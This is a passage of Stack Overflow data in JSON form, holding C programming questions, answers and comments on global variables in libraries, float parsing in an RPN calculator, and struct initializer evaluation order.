"https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459355283, "post_id": 36314528, "comment_id": 60252396, "body": "See the tags! This is about C, not C++."}, {"owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459355702, "post_id": 36314528, "comment_id": 60252705, "body": "sorry man, I am just coding in c++ and that was why I&#39;ve wrote cpp instead of c, thats not a reason for voting negative"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459356011, "post_id": 36314528, "comment_id": 60252914, "body": "Well, it is. Because typical compiler-frontends like the gcc will invoke the C++ compiler. Which is a different language and a really bad idea when compiling C code. But it&#39;s not just for that. Your recommendation is just wrong (please understand the difference between <i>declaration</i> and <i>definition</i> and what the <code>extern</code> specifier means. Btw. this is similar in C++. See the comments and other answers."}], "tags": [], "owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "is_accepted": false, "score": 0, "last_activity_date": 1459355717, "last_edit_date": 1459355717, "creation_date": 1459355158, "answer_id": 36314528, "question_id": 36314426, "link": "https://stackoverflow.com/questions/36314426/do-you-define-global-variables-in-a-c-library/36314528#36314528", "title": "Do you define global variables in a C library?", "body": "<p>There should be no problem, or you can declare them in the .c and use extern in the .h file</p>\n"}, {"tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": false, "score": 10, "last_activity_date": 1459355190, "creation_date": 1459355190, "answer_id": 36314539, "question_id": 36314426, "link": "https://stackoverflow.com/questions/36314426/do-you-define-global-variables-in-a-c-library/36314539#36314539", "title": "Do you define global variables in a C library?", "body": "<blockquote>\n  <p>Can I declare the global variables in the header file?</p>\n</blockquote>\n\n<p>Yes, you can declare your global variables in the header file. However, these must be declarations, not definitions of your global variables.</p>\n\n<p>In other words, the header should say</p>\n\n<pre><code>// This goes into the header\nextern int my_global_int;\n</code></pre>\n\n<p>and the C file should say</p>\n\n<pre><code>int my_global_int;\n</code></pre>\n\n<p><strong>Note:</strong> The fact that you <em>can</em> do it does not mean that you <em>should</em> do it. Exposing \"raw\" global variables from a library is a bad practice, because users of your library can do unexpected things to them.</p>\n\n<p>A better approach would be hiding your globals by making them <code>static</code>, and exposing functions to manipulate them instead:</p>\n\n<pre><code>// This goes into the header\nint get_global();\nvoid set_global(int n);\n\n// This goes into the C file\nstatic int my_former_global;\n\nint get_global() {\n    return my_former_global;\n}\nvoid set_global(int n) {\n    if (&lt;n-is-valid&gt;) {\n        my_former_global = n;\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459355483, "post_id": 36314583, "comment_id": 60252529, "body": "I hope you meant &quot; it is a bad habit to <b>___</b> do it&quot;."}, {"owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "edited": false, "score": 0, "creation_date": 1459363130, "post_id": 36314583, "comment_id": 60257492, "body": "no what I meant there are so many approaches in C for evreything but there are some standerds that you have to follow so the others can easly understand your code this is it ^_^"}], "tags": [], "owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459357260, "last_edit_date": 1459357260, "creation_date": 1459355354, "answer_id": 36314583, "question_id": 36314426, "link": "https://stackoverflow.com/questions/36314426/do-you-define-global-variables-in-a-c-library/36314583#36314583", "title": "Do you define global variables in a C library?", "body": "<p>Yes, you can, but it is a bad habit; do not do it .</p>\n"}, {"tags": [], "owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "is_accepted": false, "score": 1, "last_activity_date": 1459356221, "last_edit_date": 1459356221, "creation_date": 1459355805, "answer_id": 36314748, "question_id": 36314426, "link": "https://stackoverflow.com/questions/36314426/do-you-define-global-variables-in-a-c-library/36314748#36314748", "title": "Do you define global variables in a C library?", "body": "<p>Try to minimize the use of global variables as they make a program less readable and more error-prone. A library should be used trough its interface (passing data back and forth between the functions it provides), not by accessing global variables.</p>\n\n<p>In situations where there's really no other way, such as sharing data with a interrupt service routine for example, try to keep the variables contained to that compilation unit by making them static, so they cannot interfere with other libraries.</p>\n\n<p>If for some reason you really need a global variable, define it in the code file (c file) and declare it as extern in the header file.</p>\n"}], "owner": {"reputation": 75, "user_id": 5899210, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/c4b7c65d42690bcb325f157aa9f881ac?s=128&d=identicon&r=PG&f=1", "display_name": "transcend", "link": "https://stackoverflow.com/users/5899210/transcend"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7242, "favorite_count": 0, "answer_count": 5, "score": 2, "last_activity_date": 1459357260, "creation_date": 1459354839, "last_edit_date": 1459356942, "question_id": 36314426, "link": "https://stackoverflow.com/questions/36314426/do-you-define-global-variables-in-a-c-library", "title": "Do you define global variables in a C library?", "body": "<p>Currently I have subroutines and global variables defined above my <code>main()</code>. I'm trying to create a library in C. Can I declare the global variables in the header file?</p>\n"}, {"tags": ["c", "stack", "type-conversion", "postfix-notation"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459357148, "post_id": 36314164, "comment_id": 60253677, "body": "regarding this line: <code>while(fgets(str,500,p)!=&#39;\\0&#39;){</code>,  the function: <code>fgets()</code> never returns a NUL character.  From the man page: <code>fgets() return s on success, and NULL on error or when end of file occurs while no characters have been read.</code> where <code>s</code> is the pointer that was passed as the first parameter.  Suggest checking for <code>NULL</code> rather than <code>&#39;\\0&#39;</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459357235, "post_id": 36314164, "comment_id": 60253741, "body": "regarding this line: <code>if (isdigit(str[i])) {</code> this cannot input a float value, because a <code>.</code> is not a digit and without the <code>.</code> it is not a float value."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459357323, "post_id": 36314164, "comment_id": 60253786, "body": "the function: <code>strtod()</code> works with <code>doubles</code> not <code>floats</code>  suggest using: <code>strtof()</code>"}], "answers": [{"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": false, "score": 0, "last_activity_date": 1459357110, "creation_date": 1459357110, "answer_id": 36315173, "question_id": 36314164, "link": "https://stackoverflow.com/questions/36314164/error-in-using-atof-and-strtod-when-trying-to-convert-numerical-string-into/36315173#36315173", "title": "Error in using atof() and strtod() when trying to convert numerical string into float", "body": "<p>You could try to manually process decimal values almost the same you process integers, but in C it would be simpler to directly iterate a number in a single pass:</p>\n\n<pre><code>while(fgets(str, sizeof(str), stdin) != NULL) {\n    unsigned int i;\n    for (i=0; i&lt;strlen(str); i++) {\n        if (isdigit(str[i])) {\n            data = str[i++] - '0'; // initialize data with first digit\n            while(isdigit(str[i])) {\n                data = data * 10 + (str[i++] - '0');  // increment with other digits\n            }\n            if (str[i] == '.') { // decimal part\n                double mult = .1;\n                i++;\n                while(isdigit(str[i])) {\n                    data = data + mult * (str[i++] - '0'); // increment with decimal part\n                    mult *= .1;\n                }\n            }\n            push(data);\n        }\n        ...\n</code></pre>\n\n<p>But in fact <code>strtod</code> does it for you...:</p>\n\n<pre><code>while(fgets(str, sizeof(str), stdin) != NULL) {\n    unsigned int i;\n    for (i=0; i&lt;strlen(str); i++) {\n        if (isdigit(str[i])) {\n            char *end;\n            data = ::strtod(str+i, &amp;end);\n            i = end - str;  // that's all we are past the number...\n            push(data);\n        }\n        ...\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 5854193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d6bb53953df5702e844906927da08cc?s=128&d=identicon&r=PG&f=1", "display_name": "A. Joseph Desmond", "link": "https://stackoverflow.com/users/5854193/a-joseph-desmond"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 549, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459357110, "creation_date": 1459354039, "question_id": 36314164, "link": "https://stackoverflow.com/questions/36314164/error-in-using-atof-and-strtod-when-trying-to-convert-numerical-string-into", "title": "Error in using atof() and strtod() when trying to convert numerical string into float", "body": "<p>I've made code to read expressions from a file in postfix notation (RPN) and output the value. While it is correctly reading the values and displaying outputs for expressions without any numbers that use decimal places, it defaults to error for any expression containing a float value.</p>\n\n<p>Basically, if a digit is found within a string read from file, it needs to be converted to a float. </p>\n\n<p>I've unsuccesfully tried setting the data value equal to atof(str) and strtod(const char *str, char **endptr), but I'm still getting the error.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n\nint top = -1;\nfloat stack[500];\n\n/* push the given data into the stack */\nvoid push (int data) {\nstack[++top] = data;\n}\n\n /* Pop the top element from the stack */\nfloat pop () {\nfloat data;\nif (top == -1)\n    return -1;\ndata = stack[top];\nstack[top] = 0;\ntop--;\nreturn (data);\n}\n\nint main() {\n\nchar str[500];\nFILE *p;\nif((p=fopen(\"testfile1.txt\",\"r\"))==NULL){\n    printf(\"\\n Unable to open file string.txt\");\n    return 1;\n}\n\nwhile(fgets(str,500,p)!='\\0'){\n\n    float data = -1, operand1, operand2, result;\n\n    for (int i = 0; i &lt; strlen(str); i++) {\n        if (isdigit(str[i])) {\n            /*\n             * if the i/p char is digit, parse\n             * character by character to get\n             * complete operand\n             */\n            data = (data == -1) ? 0 : data;\n            data = (data * 10) + (str[i] - 48);\n            continue;\n        }\n\n        if (data != -1) {\n            /* if the i/p is operand, push it into the stack */\n            push(data);\n        }\n\n        if (str[i] == '+' || str[i] == '-'\n                || str[i] == '*' || str[i] == '/') {\n            /*\n             * if the i/p is an operator, pop 2 elements\n             * from the stack and apply the operator\n             */\n            operand2 = pop();\n            operand1 = pop();\n            if (operand1 == -1 || operand2 == -1)\n                break;\n            switch (str[i]) {\n                case '+':\n                    result = operand1 + operand2;\n                    /* push the result into the stack */\n                    push(result);\n                    break;\n                case '-':\n                    result = operand1 - operand2;\n                    push(result);\n                    break;\n                case '*':\n                    result = operand1 * operand2;\n                    push(result);\n                    break;\n                case '/':\n                    result = operand1 / operand2;\n                    push(result);\n                    break;\n            }\n        }\n        data = -1;\n    }\n    if (top == 0)\n        printf(\"Output:%3.2f\\n\", stack[top]);\n    else\n        printf(\"have given wrong postfix expression\\n\");\n    return 1;\n}\n}\n</code></pre>\n\n<p>There are 5 postfix expressions in the file, and they are as follows:</p>\n\n<pre><code> 13 1 - 2 / 3 155 + *\n 100 100 100 100 + + +\n 10.33 2 2 2 2 2 * * * * *\n 30 10 - 10 - 10 - 2 *\n 300 13.25 - 11 3 - / 4 5 - * 3 /\n</code></pre>\n\n<p>But, the output of the program denies the third expression because it contains 10.33, which is not an integer value.</p>\n\n<p>Output:</p>\n\n<pre><code>Output: 948.00\nOutput: 400.00\nhave given wrong postfix expression\nOutput:   0.00\nOutput: 300.00\n</code></pre>\n\n<p>Does anyone know how to modify this code to handle floats?</p>\n\n<p>Cheers.</p>\n"}, {"tags": ["c", "struct", "initialization"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459353728, "post_id": 36314005, "comment_id": 60251414, "body": "Why is the order important?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459353806, "post_id": 36314005, "comment_id": 60251462, "body": "BTW, should make certain the product is calculated using <code>size_t</code> math: <code>bmp.w * bmp.h</code> --&gt; <code>(size_t) bmp.w * bmp.h</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459353826, "post_id": 36314005, "comment_id": 60251474, "body": "If the <code>bmp.b</code> field is being initialized first, then <code>bmp.w</code> and <code>bmp.h</code> fields contain garbage at the time of <code>bmp.b</code> initialization, and thus thing like <code>calloc(-542 * 3546, sizeof(*bmp.b))</code> can occur."}, {"owner": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "edited": false, "score": 0, "creation_date": 1459353893, "post_id": 36314005, "comment_id": 60251518, "body": "Is there a reason you can&#39;t just use <code>calloc(w * h, sizeof(*bmp.b))</code>?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459353905, "post_id": 36314005, "comment_id": 60251528, "body": "Yes I see, use <code>{w, h, calloc((size_t) w * h, sizeof(*bmp.b))}</code>"}, {"owner": {"reputation": 244, "user_id": 6134918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dd3c3e4c2313fe66cc45a8b1e5c8e96?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo", "link": "https://stackoverflow.com/users/6134918/hugo"}, "edited": false, "score": 0, "creation_date": 1459353922, "post_id": 36314005, "comment_id": 60251543, "body": "In this particular case, it should because the compiler would optimize, as the values (7,4) are hardcoded. However, if they are dynamic, then this may  depend on the compiler that shall be used."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "reply_to_user": {"reputation": 2640, "user_id": 5195699, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f85291bb71f55981b1d412f1efcb7603?s=128&d=identicon&r=PG&f=1", "display_name": "R_Kapp", "link": "https://stackoverflow.com/users/5195699/r-kapp"}, "edited": false, "score": 0, "creation_date": 1459353972, "post_id": 36314005, "comment_id": 60251577, "body": "@R_Kapp in real code, I&#39;m using <code>w + 1</code> and <code>h + 1</code>, which together would result in ugly <code>calloc((w + 1) * (h + 1), sizeof(*bmp.b))</code>. And what if the &#39;w&#39; and &#39;h&#39; were even more heavily modified?"}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459354945, "post_id": 36314005, "comment_id": 60252178, "body": "Interestingly, even though the answer to each of your questions is affirmative, the code is still broken. Shows how hard it can be to even ask the right question!"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459355020, "post_id": 36314005, "comment_id": 60252220, "body": "@KerrekSB What do you mean broken? It works just fine if you include the <code>stdlib</code> header. And I&#39;m using the C99 standard, not the ancient C89."}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459355112, "post_id": 36314005, "comment_id": 60252270, "body": "@Xis88: See R Sahu&#39;s answer?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459355176, "post_id": 36314005, "comment_id": 60252327, "body": "@KerrekSB The affirmative answers have been deleted/edited by their authors."}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459356550, "post_id": 36314005, "comment_id": 60253265, "body": "@Xis88: I think you misunderstand: The answer to all <i>your</i> questions is &quot;yes&quot;, as R Sahu explains: Yes, the struct is initialized sequentially, and yes, <code>bmp.b</code> is initialized only after <code>bmp.h</code> and <code>bmp.w</code>. But the important point you&#39;re missing is that the evaluation of the initial value for <code>bmp.b</code> causes undefined behaviour."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459357659, "post_id": 36314005, "comment_id": 60254024, "body": "@KerrekSB Do you mean <code>sizeof(*bmp.b)</code>? It&#39;s not UB: <a href=\"http://stackoverflow.com/questions/19785518/is-dereferencing-null-pointer-valid-in-sizeof-operation\" title=\"is dereferencing null pointer valid in sizeof operation\">stackoverflow.com/questions/19785518/&hellip;</a>"}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459357736, "post_id": 36314005, "comment_id": 60254074, "body": "@Xis88: No, I don&#39;t mean that. I mean <code>calloc(bmp.w * bmp.h, sizeof(*bmp.b))</code>, which requires two lvalue conversions of possibly uninitialized values. Just as R Sahu describes in his excellent answer."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1459357855, "post_id": 36314005, "comment_id": 60254155, "body": "@KerrekSB Oh, got it. Thank you for clearing that up."}], "answers": [{"comments": [{"owner": {"reputation": 1799, "user_id": 5867869, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/M7o7w.jpg?s=128&g=1", "display_name": "RomCoo", "link": "https://stackoverflow.com/users/5867869/romcoo"}, "edited": false, "score": 0, "creation_date": 1459355365, "post_id": 36314349, "comment_id": 60252453, "body": "bmp is not defined in the first line, so it has to be <code>*b = calloc(w * h, sizeof(*b));</code>"}], "tags": [], "owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "is_accepted": false, "score": 2, "last_activity_date": 1459356167, "last_edit_date": 1459356167, "creation_date": 1459354635, "answer_id": 36314349, "question_id": 36314005, "link": "https://stackoverflow.com/questions/36314005/is-it-safe-to-reference-the-struct-that-is-being-initialized-in-its-initializer/36314349#36314349", "title": "Is it safe to reference the struct that is being initialized in its initializer?", "body": "<p>No, it's not safe.</p>\n\n<p>Quoted from N1570 6.7.9 Initialization, emphasis mine:</p>\n\n<blockquote>\n  <p>23 The evaluations of the initialization list expressions are\n  indeterminately sequenced with respect to one another and thus <strong>the\n  order in which any side effects occur is unspecified</strong>.</p>\n</blockquote>\n\n<p>In your code, <code>calloc(bmp.w * bmp.h, sizeof(*bmp.b))</code> is not guaranteed to be evaluated before <code>bmp.w</code> and <code>bmp.h</code> are initialised. This means you have to write </p>\n\n<pre><code>int w = 7, h = 4, *b = calloc(w * h, sizeof *b);\nstruct Bitmap bmp = {w, h, b};\n</code></pre>\n\n<p>or</p>\n\n<pre><code>struct Bitmap bmp = {w, h, calloc(w * h, sizeof *b)};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 7, "last_activity_date": 1459354666, "last_edit_date": 1592644375, "creation_date": 1459354666, "answer_id": 36314362, "question_id": 36314005, "link": "https://stackoverflow.com/questions/36314005/is-it-safe-to-reference-the-struct-that-is-being-initialized-in-its-initializer/36314362#36314362", "title": "Is it safe to reference the struct that is being initialized in its initializer?", "body": "<p>Using</p>\n<pre><code>Bitmap bmp = {w, h, calloc(bmp.w * bmp.h, sizeof(*bmp.b))};\n</code></pre>\n<p>is undefined behavior. There are two items in the C99 standard that address this.</p>\n<blockquote>\n<p><strong>6.7.8. Initialization</strong></p>\n<p>...</p>\n<p>19 The initialization shall occur in initializer list order, each initializer provided for a particular subobject overriding any previously listed initializer for the same subobject.</p>\n<p>...</p>\n<p>23 The order in which any side effects occur among the initialization list expressions is unspecified.133)</p>\n</blockquote>\n<p>and footnote 133 says:</p>\n<blockquote>\n<p>In particular, the evaluation order need not be the same as the order of subobject initialization</p>\n</blockquote>\n<p>Together, what they mean is that <code>bmp.w</code> will be initialized before <code>bmp.h</code>. However, it is possible that <code>calloc(bmp.w * bmp.h, sizeof(*bmp.b))</code> is evaluated before <code>bmp.w</code> and <code>bmp.h</code> are initialized. Hence the undefined behavior.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user2933244"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 1, "accepted_answer_id": 36314362, "answer_count": 2, "score": 6, "last_activity_date": 1459356167, "creation_date": 1459353466, "last_edit_date": 1459354894, "question_id": 36314005, "link": "https://stackoverflow.com/questions/36314005/is-it-safe-to-reference-the-struct-that-is-being-initialized-in-its-initializer", "title": "Is it safe to reference the struct that is being initialized in its initializer?", "body": "<p>Say I've got this type:</p>\n\n<pre><code>struct Bitmap\n{\n    int w, h, *b;\n};\n</code></pre>\n\n<p>I am initializing it like this:</p>\n\n<pre><code>int w = 7, h = 4;\nstruct Bitmap bmp = {w, h, calloc(bmp.w * bmp.h, sizeof(*bmp.b))};\n</code></pre>\n\n<p>Is it guaranteed that the compiler will initialize the <code>struct</code> sequentially? Can I be sure that by the time the <code>bmp.b</code> field is being initialized the <code>bmp.w</code> and <code>bmp.h</code> fields are already initialized?</p>\n"}, {"tags": ["c", "computation"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 6, "creation_date": 1459353389, "post_id": 36313891, "comment_id": 60251169, "body": "Welcome to Stack Overflow! It sounds like you may need to learn how to use a debugger to step through your code. With a good debugger, you can execute your program line by line and see where it is deviating from what you expect. This is an essential tool if you are going to do any programming. Further reading: <a href=\"http://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs</a>."}, {"owner": {"reputation": 11, "user_id": 6135656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a15f98cf6d07ad168e4df88d091c3d04?s=128&d=identicon&r=PG&f=1", "display_name": "kidchicken", "link": "https://stackoverflow.com/users/6135656/kidchicken"}, "reply_to_user": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1459353770, "post_id": 36313891, "comment_id": 60251436, "body": "Im not sure this problem Im having here can be solved by a debugger, but ill give it a shot if you think it will help."}, {"owner": {"reputation": 244, "user_id": 6134918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dd3c3e4c2313fe66cc45a8b1e5c8e96?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo", "link": "https://stackoverflow.com/users/6134918/hugo"}, "edited": false, "score": 3, "creation_date": 1459354006, "post_id": 36313891, "comment_id": 60251610, "body": "@kidchicken with the debugger you can stop and analyse every variable and its value. So Paul&#39;s statement was, that if you use a debugger you would be able to figure out the problem yourself"}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 1, "creation_date": 1459354124, "post_id": 36313891, "comment_id": 60251688, "body": "Also, just a comment, but perhaps that would improve readability and help you to debug. Try to remove all these awful <code>long long</code>s and switch to <code>int</code>s."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1459355231, "post_id": 36313891, "comment_id": 60252358, "body": "&#39;Im not sure this problem Im having here can be solved by a debugger,&#39; - why not?  You have a repeatable problem with a particular, known input, EXACTLY the kind of bug that can be traced with your debugger as you step through and note all the variable values as you go."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1459355350, "post_id": 36313891, "comment_id": 60252445, "body": "When ia debugger less than useful?  When you have 